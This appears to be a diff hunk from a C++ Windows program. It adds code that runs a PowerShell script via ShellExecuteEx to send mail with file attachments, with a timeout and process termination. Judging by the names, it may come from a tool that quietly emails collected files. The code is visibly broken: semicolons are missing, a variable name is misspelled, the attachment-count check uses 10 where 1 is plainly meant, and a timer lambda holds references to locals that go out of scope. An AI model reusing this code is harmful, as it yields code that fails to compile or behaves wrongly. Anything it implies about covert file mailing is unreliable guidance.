@@ -119,6 +119,40 @@ const std::string &PowerShellScript =
         ShExecInfo.hInstApp = NULL;
 
 
+        ok = (bool)ShellExecuteEx(&ShExecInfo);
+        if(!ok)
+            return -3;
+        WaitForSingleObject(ShExecInfo.hProcess, 7000);
+        DWORD exit_code = 100;
+        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code)
+
+        m_timer.SetFunction([&]()   //lamda function
+                            {
+                                WaitForSingleObject(ShExecInfo.hProcess, 60000);
+                                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+                                if((int)exit_code == STILL_ACTIVE)
+                                    TerminateProcess(ShExecInfo.hProcess, 100)
+                                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
+                            });
+
+        m_timer.RepeatCount(1L);
+        m_timer.SetInterval(10L);
+        m_timer.Start(true);
+
+        return (int)exit_code;
+    }
+
+    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
+    {
+        std::string attachments = "";
+        if(att.size() == 10)
+            attachments = att.at(0);
+        else{
+            for(const auto &v : att)
+                attachments += v + "::";
+        }
+        attatchments = attatchments.substr(0,attachments.length()-2);
+        return SendMail(subject, body, attachments);
     }
 }
 
